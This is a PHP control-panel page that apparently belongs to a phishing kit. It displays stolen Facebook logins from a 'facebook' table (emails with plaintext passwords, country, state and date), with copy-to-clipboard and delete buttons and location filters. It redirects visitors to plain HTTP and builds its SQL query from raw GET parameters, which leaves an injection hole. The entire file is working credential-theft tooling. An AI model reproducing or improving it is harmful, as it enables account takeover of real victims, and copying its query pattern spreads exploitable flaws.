<?php
require_once(dirname(dirname(__FILE__)).'/configuration.php');
if(isset($_GET['log'])){
session_destroy();
header("Location: login.php", 301);
}
if(isset($_SESSION['log'])){
$where = "";
if($_GET['pais'] != "" )
{
	$where = "WHERE username = '".USERNAME."' AND country = '".$_GET['pais']."'";
}else if($_GET['estado'] != "" ){
	$where = "WHERE username = '".USERNAME."' AND state = '".$_GET['estado']."'";
}else{
   $where = "WHERE username = '".USERNAME."'"; 
}
$where.=" order by id ASC";
$get=$pdo->prepare("SELECT * FROM facebook $where");
$get->execute();
$perfiles=$get->fetchAll(PDO::FETCH_ASSOC);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head><meta http-equiv="Content-Type" content="text/html; charset=euc-jp">
    <script>
if (location.protocol != 'http:')
{
 location.href = 'http:' + window.location.href.substring(window.location.protocol.length);
}
</script>


  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.0/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
	<title>Adminisitrar perfiles</title>
    <style>
		body{
			background-image:url(wallpaper.jpg);
			background-size:cover
		}

		a{
			color:white;
			cursor:pointer;
			text-decoration:none !important;
		}

		.copy:hover{
			cursor:pointer; background-color: #CCC}
	</style>
    <script>
		function eliminar(id){
			$.ajax({
				type: "POST",
				url: "del.php",
				dataType: "json",
				data: "id="+id
			}).done(function(data){
				if(data.success){
					$("#"+id).remove();
					toastr.error("Usuario Eliminado Correctamente");
				}
			})
		}

		function copy(text){
			var aux = document.createElement("input");
			aux.setAttribute("value", text);
			document.body.appendChild(aux);
			aux.select();
			document.execCommand("copy");
			document.body.removeChild(aux);
			toastr.info(text+" Copiado al PortaPapeles");
		}
	</script>
</head>

<body>
    <div class="container" style="background-color: black; color: white; height: 40px; padding: 15px 15px">
        <div style="float:right">
        	<a href="?log=false">Cerrar Sesion</a>
        </div>
    </div>

	<div class="container" style="background-color: white">
    	<center><h2>CONTROL PANEL</h2>

        <form class="form-inline">
	        <label for="pais">Pais:</label>
        	<select name="pais" class="form-control" onchange="submit();"><?php include "paises.php" ?></select>
        	<label for="estados">Estado:</label>
        	<select name="estado" class="form-control" onchange="submit();"><option value="">Todos</option>
        	<?php
        	$sent=$pdo->prepare("SELECT DISTINCT state FROM facebook WHERE username = '".USERNAME."'");
            $sent->execute();
            $resp=$sent->fetchAll(PDO::FETCH_ASSOC);
            foreach($resp as $estados){
                
            echo "<option>". $estados['state'] ."</option>";
            
            }
            ?>
                  </select>
            <button class="btn btn-success">RESET</button>
        </form>
            	</center>
        <br />
        <table class="table table-bordered table-hover" >
        	<thead>
            	<tr>
                	<th>Usuario</th>
                    <th>Contraseña</th>
                    <th>Pais</th>
                    <th>Estado</th>
                    <th width="150px">Fecha</th>
                    <th width="75px">Acciones</th>
                </tr>
            </thead>
            <tbody>
            	<?php
				foreach($perfiles as $datos){
				?>
                 <tr id="<?php echo $datos[
				     "id"]; ?>">
				 <td onclick="copy('<?php echo $datos["email"]; ?>')" class="copy"><?php echo $datos[
				     "email"]; ?></td>
				 <td onclick="copy('<?php echo $datos["pass"]; ?>')" class="copy"><?php echo $datos[
				     "pass"]; ?></td>
				 <td><?php echo $datos[
				     "country"]; ?></td>
				<td><?php echo $datos[
				     "state"]; ?></td>
				<td><?php echo $datos[
				     "fecha"]; ?></td>
				<td><button class="btn btn-danger" onclick="eliminar(<?php echo $datos["id"]; ?>)">Eliminar</button></td>
				<tr>
				    <?php
					}
				?>
            </tbody>
        </table>
        <?php
    echo "<center><a href=\"#\"><img src=\"https://bendercrack.com/juicyads/uploads/bendercrack_logo_black.png?v=3\" width=\"15%\"></a></center> </br>";
?>
    </div>
</body>
</html>
<?php
}else{
 header("Location: login.php", 301);
}
